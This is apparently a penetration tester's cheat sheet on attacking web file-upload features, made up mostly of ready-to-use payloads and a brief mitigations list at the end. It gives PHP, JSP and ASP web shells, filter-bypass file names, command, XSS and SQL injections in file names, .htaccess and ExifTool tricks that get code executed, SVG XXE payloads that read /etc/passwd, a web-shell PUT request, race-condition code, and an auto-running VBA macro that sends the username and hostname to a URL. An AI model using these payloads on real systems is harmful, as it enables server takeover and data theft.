# File Upload

<details>

<summary>Basic Payloads</summary>

{% code lineNumbers="true" %}
```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```
{% endcode %}

</details>

### RCE via Web Shell <sup><sub>(Absent Validation)<sub></sup>

* We may directly upload our web shell or reverse shell script to the web application, and then by just visiting the uploaded script, we can interact with our web shell or send the reverse shell.
* No restriction specified in accept-type header - all types (_/_) allowed
* Identifying Web Framework and choose the appropriate command or web shell.
  * &#x20;To determine what language runs the web application is to visit the `/index.ext`  and FUZZ the extension using various [SecLists-web-extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)
  * [Wappalyzer](https://www.wappalyzer.com/) extension
* [#web-shells](../../network/exploitation/shells-and-listeners.md#web-shells "mention")

<details>

<summary>One-Liner Web Shells</summary>

{% code lineNumbers="true" %}
```shellscript
## PHP
<?php system($_REQUEST["cmd"]); ?>
## JSP
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
## ASP
<% eval request("cmd") %>
```
{% endcode %}

</details>

### Obfuscate Blacklisted/Whitelisted Extension&#x20;

* Try following patterns by providing multiple extensions&#x20;
  * `filename.php.jpg`, `filename.jpg.php`, `filename.php.`, `filename%2Ephp` <sup><sub>(url encode)<sub></sup>, `filename.pphphp`
  * `filename.php.jpg`  - This works under certain conditions when the server is misconfigured. Logic would be such that code validates whether the extension is allowed type (ie `.jpg`)   but if the server config files are misconfigured the PHP code will be executed.
* In Windows Servers, file names are case insensitive, so we may try uploading a `php` with a mixed-case (e.g. `pHp`), which may bypass the blacklist.
* Add trailing characters (".") - > `filename.php.`
* Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes.
* Add semicolons <sup><sub>(windows server)<sub></sup> or URL-encoded null byte characters before the file extension. (`%00`)
  * eg: `shell.aspx:.jpg` , `shell.php%00.jpg`
* Try using multibyte Unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. (`xC0 x2E`, `xC4 xAE` or `xC0 xAE` translated to x2E if parsed as UTF-8 string)&#x20;
* Use nested extensions to bypass stripping - `pphphp`&#x20;
* Characters to use before or after final extension.
  * `%20` , `%0a` , `%00` , `%0d0a` , `/` , `.\` , `.` , `…` , `:`&#x20;
* ```bash
  for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
      for ext in '.php' '.phps'; do
          echo "shell$char$ext.jpg" >> wordlist.txt
          echo "shell$ext$char.jpg" >> wordlist.txt
          echo "shell.jpg$char$ext" >> wordlist.txt
          echo "shell.jpg$ext$char" >> wordlist.txt
      done
  done
  ```
* #### Fuzzing Extensions <a href="#fuzzing-extensions" id="fuzzing-extensions"></a>
  * **Wordlists** -  [PayloadsAllTheThings-ExtensionsPHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst), [PayloadsAllTheThings-ExtensionsASP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20ASP/extensions.lst), [SecLists-web-extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)
  * **Note**: Un-tick the `URL Encoding` option to avoid encoding the (`.`) before the file extension if fuzzing using BurpSuite.

### Content-Type Restriction Bypass

* Modify `Content-Type` header to allowed file types
* Upload any php or similar file
* Server does not validate content-type header with the file extension or contents.
* In some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as `POST` data), in which case we will need to modify the main Content-Type header.
* #### Fuzzing Content-Types
  * **Wordlists** - [SecLists-web-all-content-types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)

### MIME-Type Restriction Bypass

* It is an internet standard that determines the type of a file through its general format and bytes structure.
* File types always contain a specific sequence of bytes in their header or footer, [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures) or [Magic Bytes](https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime)
* eg -> JPEG -> `FF D8 FF` , GIF -> `GIF87a` or `GIF89a`

### Path Traversal Bypass

* Restrictions on user-directory for permitted file types&#x20;
* Change the directory where files are uploaded
* Filename contains -> `../../exploit.php` (try encoding for ../../)

### Injections in File Name <a href="#injections-in-file-name" id="injections-in-file-name"></a>

* Use a malicious string for the uploaded file name, which may get executed or processed if the uploaded file name is displayed (i.e., reflected) on the page.
* **Payloads**: &#x20;
  * OS command in the file name `file$(whoami).jpg` ,  ``file`whoami`.jpg`` , `file.jpg||whoami`
  * XSS payload in the file name `<script>alert(window.origin);</script>`
  * SQL query in the file name `file';select+sleep(5);--.jpg`&#x20;

### Upload Directory Disclosure <a href="#upload-directory-disclosure" id="upload-directory-disclosure"></a>

* We may utilize fuzzing to look for the uploads directory or even use other vulnerabilities (e.g., LFI/XXE) to find where the uploaded files are by reading the web applications source code.
* Cause errors by uploading a file with a name that already exists or sending two identical requests simultaneously.
* Upload a file with an overly long name (e.g., 5,000 characters)

### Windows-specific Attacks <a href="#windows-specific-attacks" id="windows-specific-attacks"></a>

* Using reserved characters, such as (`|`, `<`, `>`, `*`, or `?`), which are usually reserved for special uses like wildcards.
* If the web application does not properly sanitize these names or wrap them within quotes, they may refer to another file (which may not exist) and cause an error that discloses the upload directory.
* We may use Windows reserved names for the uploaded file name, like (`CON`, `COM1`, `LPT1`, or `NUL`), which may also cause an error as the web application will not be allowed to write a file with this name.
* Older versions of Windows were limited to a short length for file names, so they used a Tilde character (`~`) to complete the file name. To refer to a file called (`hackthebox.txt`) we can use (`HAC~1.TXT`) or (`HAC~2.TXT`), where the digit represents the order of the matching files that start with (`HAC`)
* Windows still supports this convention, we can write a file called (e.g. `WEB~1.CON`) to overwrite the `web.conf` file.

### Override Blacklist Extension&#x20;

* 1\. Overriding server configuration `/etc/apache2/apache2.conf`
* `LoadModule php_module /usr/lib/apache2/modules/libphp.so`\
  `AddType application/x-httpd-php .php`&#x20;
* Create special configuration file within individual directories
* Upload a .htaccess file
* `AddType application/x-httpd-php .133t`&#x20;
* Modify `Content-Type` to text/plain&#x20;
* Upload a php payload with extension .133t which will be treated as `php` file.
* Other server configuration locations
  * `/etc/apache2/mods-enabled/php7.4.conf`

### Malicious Client-Side Scripts

* Upload HTML files or SVG images or XML
* Use tags to create stored XSS payloads&#x20;
* [ExifTool](https://exiftool.org/)
  * Create a polyglot JPEG file containing malicious code within its metadata \*
  * `exiftool -Comment="<?php echo 'START ' . file_get_contents('<path>') . ' END'; ?>"-i <input-image> -o <output-image>`  <sup><sub>(Output between START and END strings)<sub></sup>
  * `exiftool -Comment='"><img src=1 onerror=alert(window.origin)>' xss.jpg`  <sup><sub>(When the image's metadata is displayed, the XSS payload will be triggered or change the image's MIME-Type to<sub></sup> <sup><sub> </sup><sup><sub>`text/html`<sub></sup>  <sup><sub>  </sup><sup><sub>to render it as a HTML document)<sub></sup>
* #### DoS Attacks <a href="#dos" id="dos"></a>
  * **Decompression Bomb** - If a web application automatically unzips a ZIP archive, it is possible to upload a malicious archive containing nested ZIP archives within it, which can eventually lead to many Petabytes of data, resulting in a crash on the back-end server.
  * **Pixel Flood** - We can create any `JPG` image file with any image size (e.g. `500x500`), and then manually modify its compression data to say it has a size of (`0xffff x 0xffff`), which results in an image with a perceived size of 4 Gigapixels. When the web application attempts to display the image, it will attempt to allocate all of its memory to this image, resulting in a crash on the back-end server.

<details>

<summary>SVG Payload</summary>

{% code lineNumbers="true" %}
```xml
<!-- XSS Payload -->
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
    <script type="text/javascript">alert("XSS");</script>
</svg>

<!-- Alternate XSS Payload -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>

<!-- XXE Payload -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

<!-- Alternate XXE Payload -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```
{% endcode %}

</details>

<details>

<summary>VBA Script Payload</summary>

{% code lineNumbers="true" %}
```vba
#Script - 1
Sub SendHostInfoToServer()
    Dim Username As String
    Dim Hostname As String
    Dim Url As String
    Dim Http As Object

    On Error GoTo ErrorHandler

    Username = Environ("USERNAME")
    Hostname = Environ("COMPUTERNAME")
    Url = "http://127.0.0.1:8888/receive?username=" & Username & "&hostname=" & Hostname

    Set Http = CreateObject("MSXML2.ServerXMLHTTP")
    Http.Open "GET", Url, False
    Http.Send

    MsgBox "Information sent successfully to: " & Url
    Exit Sub

ErrorHandler:
    MsgBox "Error " & Err.Number & ": " & Err.Description, vbCritical, "Macro Error"
End Sub

#Script - 2 (part 1)

Sub LaunchCalculator()
    On Error GoTo ErrorHandler

    Dim ShellApp As Object
    Set ShellApp = CreateObject("WScript.Shell")
    ShellApp.Run "calc.exe"

    Exit Sub

ErrorHandler:
    MsgBox "Error " & Err.Number & ": " & Err.Description, vbCritical, "Launch Error"
End Sub

#Script - 2 (part 2)

#add in "This_Workbook"

Private Sub Workbook_Open()
    LaunchCalculator
End Sub
```
{% endcode %}

</details>

<details>

<summary>HTML Payload</summary>



</details>

<details>

<summary>XML</summary>

{% code lineNumbers="true" %}
```xml
<!-- XXE Payload -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

<!-- Alternate XXE Payload -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```
{% endcode %}

</details>

### Exploiting Vulnerabilities in the Parsing of Uploaded Files&#x20;

* Server parses XML-based files, a potential vector for XXE injection attacks.
* XML data is not unique to SVG images, as it is also utilized by many types of documents, like `PDF`, `Word Documents`, `PowerPoint Documents`, among many others.

### Uploading Files using PUT

<details>

<summary>HTTP Request</summary>

{% code lineNumbers="true" %}
```http
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php system($_GET['c']);?>
```
{% endcode %}

</details>

### Exploiting File Upload Race Conditions&#x20;

* [race-conditions.md](race-conditions.md "mention")
* Uploads the file to a temp directory and perform validation - virus checks etc&#x20;
* Uploaded file is moved to an accessible folder, where checked for viruses.&#x20;
* Malicious files are removed once the virus check completes&#x20;
* Turbo Intruder extender required

<details>

<summary>Race Condition Code</summary>

{% code lineNumbers="true" %}
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)
    request1 = '''<YOUR-POST-REQUEST>'''
    request2 = '''<YOUR-GET-REQUEST>'''
    
    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    
    for x in range(5):
        engine.queue(request2, gate='race1')
        # wait until every 'race1' tagged request is ready
    	# then send the final byte of each request
    	# (this method is non-blocking, just like queue)
    
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```
{% endcode %}

</details>

### Examples of attacks

* Introducing other vulnerabilities like `XSS` or `XXE`.
* Causing a `Denial of Service (DoS)` on the back-end server.
* Overwriting critical system files and configurations.

### Mitigations

* Extension Validation
* Content Validation
* Avoid Upload Directory Disclosure
* `Content-Disposition`: Used to specify how the content should be displayed in the browser. Setting it to `attachment`
* `Content-Type`: Specifies the MIME type of the file, ensuring that the browser knows how to handle the file content appropriately.
* `X-Content-Type-Options: nosniff`: Prevents the browser from MIME-type sniffing, which helps mitigate security risks by ensuring that the browser adheres strictly to the specified `Content-Type`.
* Randomize the names of the uploaded files in storage and store their "sanitized" original names in a database.
* Store the uploaded files in a separate server or container.
* `disable_functions` configuration in `php.ini` , add dangerous functions, like `exec`, `shell_exec`, `system`, `passthru`, and a few others.
* Disable showing any system or server errors, to avoid sensitive information disclosure
* Limit file size
* Update any used libraries
* Scan uploaded files for malware or malicious strings
* Utilize a Web Application Firewall (WAF) as a secondary layer of protection
